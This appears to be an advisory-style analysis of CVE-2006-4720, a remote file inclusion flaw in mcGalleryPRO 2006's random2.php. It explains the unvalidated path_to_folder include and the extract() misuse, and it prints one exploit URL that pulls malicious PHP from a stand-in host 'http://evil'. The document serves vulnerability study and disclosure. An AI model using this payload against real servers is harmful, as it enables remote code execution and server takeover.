Based on the provided information, here's an analysis of CVE-2006-4720:

**Root Cause of Vulnerability:**

*   The vulnerability lies in the `random2.php` file of mcGalleryPRO 2006. The `path_to_folder` parameter, used to include files, is not properly validated.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application directly includes the content of the path specified by the `path_to_folder` parameter, without verifying if the given path is a legitimate local resource, or from a remote source.
*   **Lack of Input Validation:** The script does not sanitize or validate the `path_to_folder` parameter before using it in an `include` statement, allowing attackers to inject malicious code.
*   **Use of extract()**: The script makes use of `extract()` on multiple superglobals (`$_SERVER`, `$_GET`, `$_POST`, `$_COOKIE`, `$_SESSION`), which can lead to variable overwriting and unexpected behavior, though the main vulnerability resides in RFI.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By providing a URL to a malicious PHP file as the `path_to_folder` value, an attacker can force the server to execute arbitrary code, thus compromising the server.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is exploited via a specially crafted GET request to `random2.php`, with the `path_to_folder` parameter containing the URL of the attacker's malicious PHP file.

**Required Attacker Capabilities/Position:**

*   The attacker needs the ability to send HTTP requests to the vulnerable server.
*   The attacker needs a location to host a malicious PHP file, accessible via HTTP.
*   The attacker does not need prior authentication or special privileges on the target system.

**Exploit Example:**

The provided exploit example is:

```
http://somehost/path_to_mcgallerypro/random2.php?path_to_folder=http://evil
```

Where:

*   `somehost` is the target server.
*   `path_to_mcgallerypro` is the path where mcGalleryPRO is installed.
*   `evil` is the attacker's server hosting a malicious PHP file.
* `http://evil` is the malicious url where the malicious php file will be served

This URL, when accessed, will force the `random2.php` script to include and execute the malicious PHP code from the attacker's server.
